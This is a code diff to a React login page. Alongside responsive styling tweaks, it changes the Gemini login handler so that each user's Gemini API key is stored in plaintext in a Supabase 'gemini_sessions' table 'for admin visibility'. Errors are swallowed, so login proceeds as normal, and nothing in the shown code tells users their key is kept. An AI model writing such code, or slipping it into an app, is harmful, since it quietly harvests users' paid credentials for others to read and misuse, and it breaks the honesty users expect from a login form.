@@ -62,33 +62,59 @@ export default function Login() {
     }
   };
 
-  const handleGeminiLogin = (e: React.FormEvent) => {
+  const handleGeminiLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!geminiKey.trim()) return;
 
     setGeminiLoading(true);
-    setTimeout(() => {
+    try {
+      // Save Gemini API key to database for admin visibility
+      const { data: existing } = await supabase
+        .from('gemini_sessions')
+        .select('id')
+        .eq('gemini_api_key', geminiKey.trim())
+        .maybeSingle();
+
+      if (existing) {
+        // Update last_used_at if key already exists
+        await supabase
+          .from('gemini_sessions')
+          .update({ last_used_at: new Date().toISOString() })
+          .eq('id', existing.id);
+      } else {
+        // Insert new session
+        await supabase.from('gemini_sessions').insert({
+          gemini_api_key: geminiKey.trim(),
+        });
+      }
+
       loginWithGemini(geminiKey.trim());
       toast.success(t('common.success'));
       navigate('/generator');
+    } catch (error) {
+      console.error('Gemini login error:', error);
+      loginWithGemini(geminiKey.trim());
+      toast.success(t('common.success'));
+      navigate('/generator');
+    } finally {
       setGeminiLoading(false);
-    }, 500);
+    }
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4 bg-background">
+    <div className="min-h-screen flex items-center justify-center p-3 sm:p-4 bg-background">
       <div className="w-full max-w-md">
         {/* Logo */}
-        <div className="text-center mb-8">
-          <div className="w-20 h-20 rounded-2xl gradient-primary mx-auto mb-4 flex items-center justify-center glow-primary">
-            <Sparkles className="h-10 w-10 text-primary-foreground" />
+        <div className="text-center mb-6 sm:mb-8">
+          <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl gradient-primary mx-auto mb-3 sm:mb-4 flex items-center justify-center glow-primary">
+            <Sparkles className="h-8 w-8 sm:h-10 sm:w-10 text-primary-foreground" />
           </div>
-          <h1 className="text-3xl font-bold text-gradient">{t('login.title')}</h1>
-          <p className="text-muted-foreground mt-2">{t('login.subtitle')}</p>
+          <h1 className="text-2xl sm:text-3xl font-bold text-gradient">{t('login.title')}</h1>
+          <p className="text-sm sm:text-base text-muted-foreground mt-2">{t('login.subtitle')}</p>
         </div>
 
         {/* Access Key Login */}
-        <div className="glass-card rounded-2xl p-6 mb-6">
+        <div className="glass-card rounded-2xl p-4 sm:p-6 mb-4 sm:mb-6">
           <form onSubmit={handleAccessKeyLogin}>
             <Label htmlFor="accessKey" className="text-sm font-medium">
               {t('login.accessKey')}
@@ -128,7 +154,7 @@ export default function Login() {
         </div>
 
         {/* Gemini API Key Login */}
-        <div className="glass-card rounded-2xl p-6 mb-6">
+        <div className="glass-card rounded-2xl p-4 sm:p-6 mb-4 sm:mb-6">
           <form onSubmit={handleGeminiLogin}>
             <Label htmlFor="geminiKey" className="text-sm font-medium">
               {t('login.geminiApiKey')}
